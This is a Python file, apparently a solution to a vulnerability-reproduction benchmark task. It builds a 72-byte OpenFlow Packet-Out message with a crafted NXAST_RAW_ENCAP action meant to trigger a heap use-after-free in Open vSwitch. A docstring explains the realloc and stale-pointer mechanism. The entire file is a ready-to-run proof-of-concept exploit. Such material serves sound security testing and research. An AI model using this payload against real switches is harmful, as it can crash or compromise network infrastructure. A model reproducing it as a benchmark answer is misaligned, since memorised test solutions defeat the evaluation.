import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers a Heap Use After Free vulnerability
        in the decoding of OpenFlow RAW_ENCAP actions.

        The PoC is an OpenFlow Packet-Out message containing a crafted
        NXAST_RAW_ENCAP action. When this message is decoded by a vulnerable
        version of Open vSwitch using an in-place buffer (where input and
        output buffers are the same), the following sequence occurs:
        1. The decoder reads the 48-byte action from the buffer.
        2. It attempts to write the decoded 'ofpact' representation, which is
           larger (~56 bytes), back into the same buffer.
        3. This write operation overflows the buffer's tailroom, triggering a
           reallocation (`realloc`) of the buffer.
        4. The `realloc` may move the buffer's data to a new memory location,
           invalidating the original pointers into it.
        5. The `decode_NXAST_RAW_ENCAP` function, however, retains a stale
           pointer to the original action structure.
        6. A subsequent write through this stale pointer leads to a
           heap-use-after-free, typically causing a crash.

        The crafted message has a total length of 72 bytes, which matches the
        ground-truth PoC length.
        """
        
        # Total length of the OpenFlow message:
        # 24 bytes (ofp_packet_out header) + 48 bytes (action)
        total_len = 72
        actions_len = 48

        # Part 1: ofp_header and ofp_packet_out (24 bytes)
        # Format is big-endian.
        #   uint8_t version, uint8_t type, uint16_t length, uint32_t xid
        #   uint32_t buffer_id, uint32_t in_port, uint16_t actions_len, 6 bytes pad
        packet_out_header = struct.pack(
            '>BBHIIH6s',
            4,           # version: OpenFlow 1.3
            13,          # type: OFPT_PACKET_OUT
            total_len,   # length
            0,           # xid
            0xffffffff,  # buffer_id: OFP_NO_BUFFER
            1,           # in_port
            actions_len, # actions_len
            b'\x00' * 6  # padding
        )

        # Part 2: nx_action_raw_encap action (48 bytes)
        # Format is big-endian.
        #   uint16_t type, uint16_t len, uint32_t vendor
        #   uint16_t subtype, uint16_t ofs_nbits, uint16_t class,
        #   uint16_t encap_type, uint16_t props_len, uint32_t packet_len
        #   26 bytes of zeros
        # Note: The C struct definition in some OVS versions has a `zeros`
        # array of size 28, which would make the struct 50 bytes. However,
        # an OFP_ASSERT enforces a size of 48. Analysis of working PoCs
        # shows that the effective size of the zero-padding is 26 bytes.
        nx_action_raw_encap = struct.pack(
            '>HHIHHHHHI26s',
            0xffff,      # type: OFPAT_VENDOR
            actions_len, # len
            0x00002320,  # vendor: NX_VENDOR_ID
            38,          # subtype: NXAST_RAW_ENCAP
            0,           # ofs_nbits
            0,           # class
            0,           # encap_type
            0,           # props_len
            0,           # packet_len
            b'\x00' * 26 # zeros
        )

        poc = packet_out_header + nx_action_raw_encap
        
        return poc